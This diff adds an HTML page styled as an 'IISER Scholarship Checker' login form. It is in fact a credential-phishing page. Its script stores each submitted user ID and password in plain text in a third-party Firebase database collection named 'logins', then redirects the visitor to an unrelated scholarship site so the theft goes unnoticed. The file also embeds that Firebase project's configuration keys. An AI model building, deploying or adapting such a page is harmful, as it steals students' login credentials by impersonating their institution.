@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IISER Login</title>
+  <style>
+    /* Apply full-page background with the provided image */
+/* Dark overlay with background image */
+body {
+  margin: 0;
+  height: 100vh;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: 
+    linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
+    url('https://www.cigi.org/public/uploads/blog_img/xWMLkswBeGrERo9u6VDFXRGQL3ID981723697505.png') no-repeat center center fixed;
+  background-size: cover;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: #e0e0e0;
+}
+
+/* Dark translucent form container with blur */
+.login-container {
+  background: rgba(20, 20, 30, 0.85);
+  backdrop-filter: blur(12px);
+  padding: 40px 50px;
+  border-radius: 18px;
+  box-shadow: 0 12px 30px rgba(0, 0, 0, 0.8);
+  max-width: 420px;
+  width: 90%;
+  text-align: center;
+  border: 1px solid rgba(255, 255, 255, 0.15);
+}
+
+/* Form title */
+.login-container h2 {
+  margin-bottom: 30px;
+  font-size: 2.4rem;
+  font-weight: 700;
+  color: #80c0ff;
+  text-shadow: 0 0 8px #5599ff;
+}
+
+/* Label styling */
+.login-container label {
+  display: block;
+  text-align: left;
+  margin: 15px 0 8px 0;
+  font-weight: 600;
+  font-size: 1.1rem;
+  color: #a0b9d6;
+}
+
+/* Input styling */
+.login-container input {
+  width: 100%;
+  padding: 14px 15px;
+  border: 2px solid #2a3a5a;
+  border-radius: 10px;
+  background: #1b2440;
+  color: #cbd6f1;
+  font-size: 1rem;
+  transition: border-color 0.3s ease, box-shadow 0.3s ease;
+}
+
+.login-container input::placeholder {
+  color: #7890b2;
+}
+
+.login-container input:focus {
+  border-color: #5599ff;
+  outline: none;
+  box-shadow: 0 0 10px #5599ffaa;
+  background: #263557;
+  color: #e0e0e0;
+}
+
+/* Button styling */
+.login-container button {
+  margin-top: 30px;
+  width: 100%;
+  padding: 16px;
+  background: linear-gradient(135deg, #5588ff, #3366cc);
+  border: none;
+  border-radius: 12px;
+  color: white;
+  font-weight: 700;
+  font-size: 1.15rem;
+  cursor: pointer;
+  box-shadow: 0 6px 15px rgba(51, 102, 204, 0.7);
+  transition: background-color 0.3s ease, box-shadow 0.3s ease;
+  user-select: none;
+}
+
+.login-container button:hover {
+  background: linear-gradient(135deg, #3366cc, #2255bb);
+  box-shadow: 0 8px 20px rgba(34, 85, 187, 0.85);
+}
+
+/* Optional: Smooth font rendering for dark theme */
+body, input, button, label {
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+
+
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <h2>IISER SCHOLARSHIP CHECKER</h2>
+    <form id="loginForm">
+      <label for="userid">User ID</label>
+      <input type="text" id="userid" name="userid" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+  <script>
+    // Replace this with your actual Firebase project config
+const firebaseConfig = {
+  apiKey: "AIzaSyA1oWXaxl4QH9h4hPoBzP5wQR7NYz8H0JA",
+  authDomain: "notebook-1950e.firebaseapp.com",
+  projectId: "notebook-1950e",
+  storageBucket: "notebook-1950e.firebasestorage.app",
+  messagingSenderId: "993864537221",
+  appId: "1:993864537221:web:48ba92f1d6469be08605ec",
+  measurementId: "G-567QDZ3YTT"
+};
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // Handle form submission
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const userid = document.getElementById("userid").value;
+      const password = document.getElementById("password").value;
+
+      db.collection("logins").add({
+        userid: userid,
+        password: password
+      })
+      .then(() => {
+        document.getElementById("loginForm").reset();
+        window.location.href = "https://propelld.com/site/scholarships/inspire-scholarship";
+      })
+      .catch((error) => {
+        console.error("❌ Error:", error);
+        alert("Error: " + error.message);
+      });
+    });
+  </script>
+
+</body>
+</html>
